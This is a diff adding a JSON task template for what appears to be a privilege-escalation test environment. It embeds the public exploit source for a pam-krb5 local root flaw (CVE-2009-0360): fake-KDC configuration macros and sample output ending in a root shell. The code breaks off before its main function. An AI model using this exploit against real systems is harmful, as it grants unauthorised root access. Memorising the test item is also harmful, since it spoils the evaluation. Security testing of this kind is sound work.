@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_8303",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: pam-krb5 < 3.13 - Local Privilege Escalation (OSVDB-54343;CVE-2009-0360)\n\nExploit source code (8303.c):\n```\n/*\n * cve-2009-0360.c\n *\n * pam-krb5 < 3.13 local privilege escalation\n * Jon Oberheide <jon@oberheide.org>\n * http://jon.oberheide.org\n *\n * Information:\n *\n *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0360\n *\n *   pam-krb5 before 3.13, when linked against MIT Kerberos, does not properly\n *   initialize the Kerberos libraries for setuid use, which allows local\n *   users to gain privileges by pointing an environment variable to a\n *   modified Kerberos configuration file, and then launching a PAM-based\n *   setuid application.\n *\n * Usage:\n *\n *   $ gcc cve-2009-0360.c -o cve-2009-0360\n *   $ ./cve-2009-0360\n *   [+] creating krb5.conf\n *   [+] creating kdc.conf\n *   [+] creating kerberos database\n *   Loading random data\n *   Initializing database '/tmp/cve-2009-0360/principal' for realm 'TEST.COM',\n *   master key name 'K/M@TEST.COM'\n *   [+] adding principal root@TEST.COM\n *   Authenticating as principal root@TEST.COM with password.\n *   Enter KDC database master key:\n *   WARNING: no policy specified for root@TEST.COM; defaulting to no policy\n *   Principal \"root@TEST.COM\" created.\n *   [+] launching krb5kdc on 141.212.110.163:6666\n *   [+] launching su with fake KDC configuration\n *   [+] enter \"root\" at the password prompt\n *   Password:\n *   # id\n *   uid=0(root) gid=0(root) ...\n *\n * Notes:\n *\n *   This exploit will result in local privilege escalation on hosts that use\n *   the pam-krb5 module for su authentication.  Check the su and system-auth\n *   PAM configuration files in /etc/pam.d to determine if pam-krb5 is in use.\n *   Some customization of the defined constants and paths may be necessary\n *   for your environment.  Be sure to set FAKE_KDC_HOST to the IP address of\n *   an active non-loopback interface on the target machine.\n */\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <errno.h>\n#include <unistd.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n\n#define REALM \"TEST.COM\"\n#define FAKE_KDC_HOST \"141.212.110.163\"\n#define FAKE_KDC_PORT \"6666\"\n#define PRINCIPAL_NAME \"root\"\n#define PRINCIPAL_PASS \"root\"\n#define TMP_DIR \"/tmp/cve-2009-0360\"\n#define KUTIL_PATH \"/usr/sbin/kdb5_util\"\n#define KADMIN_PATH \"/usr/sbin/kadmin.local\"\n#define KRB5KDC_PATH \"/usr/sbin/krb5kdc\"\n\n#define KRB5_CONF \\\n  \"[libdefaults]\\n\\tdefault_realm = \" REALM \"\\n\\n[realms]\\n\\t\" REALM \\\n  \" = {\\n\\t\\tadmin_server = \" FAKE_KDC_HOST \":\" FAKE_KDC_PORT \"\\n\\t\\t\" \\\n  \"default_domain = \" REALM \"\\n\\t\\tkdc = \" FAKE_KDC_HOST \":\" FAKE_KDC_PORT \\\n  \"\\n\\t}\\n\\n[domain_realm]\\n\\t.\" REALM \" = \" REALM \"\\n\\t\" REALM \" = \" REALM\n\n#define KDC_CONF \\\n  \"[kdcdefaults]\\n\\tkdc_ports = \" FAKE_KDC_PORT \"\\n\\n[realms]\\n\\t\" REALM \\\n  \" = {\\n\\t\\tdatabase_name = \" TMP_DIR \"/principal\\n\\t\\tadmin_keytab = \" \\\n  \"FILE:\" TMP_DIR \"/kadm5.keytab\\n\\t\\tacl_file = \" TMP_DIR \"/kadm5.acl\" \\\n  \"\\n\\t\\tkey_stash_file = \" TMP_DIR \"/stash\\n\\t\\tkdc_ports = \" FAKE_KDC_PORT \\\n  \"\\n\\t\\tmax_life = 10h 0m 0s\\n\\t\\tmax_renewable_life = 7d 0h 0m 0s\\n\\t}\"\n\nint\nma\n```",
+  "cve": "OSVDB-54343;CVE-2009-0360",
+  "exploitdb_id": "8303",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_8303",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
